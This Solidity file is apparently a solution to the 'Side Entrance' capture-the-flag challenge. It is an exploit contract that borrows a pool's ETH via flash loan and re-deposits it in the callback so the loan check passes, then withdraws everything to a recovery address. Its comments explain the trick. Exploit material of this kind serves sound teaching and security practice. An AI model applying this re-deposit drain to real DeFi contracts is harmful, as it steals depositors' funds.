pragma solidity ^0.8.0;
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
contract SideEntranceExploiter{

    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;

    constructor(address _pool, address _recovery, uint _amount){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }

    function attack() external returns(bool){
        uint balanceBefore = address(this).balance;
        /* 
            the call to flashLoan will call our execute function below which deposits all the ETH
            via the the depoist function as it it was our own ETH.
        */
        pool.flashLoan(exploitAmount);

        // since the pool acctounting has been updated we can now call the withdraw function
        pool.withdraw();

        uint balanceAfter = address(this).balance;
        require(balanceAfter > balanceBefore, "Funds has not been transferred!");
        
        // send the funds to the recovery address
        payable(recovery).transfer(exploitAmount);
        return true;
    }

    /*
        The trick here is that the execute function is called in the flachLoan function. Instead of 
        paying back the flach loan amount directly to the pool we call the depoit function instead. 

        This updates the attack contract balance in the pool. Since the flashLoan function 
        only checks the full balance is not less than the balance before the flash loan will not revert!
    */
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }
    
    receive() external payable{}
}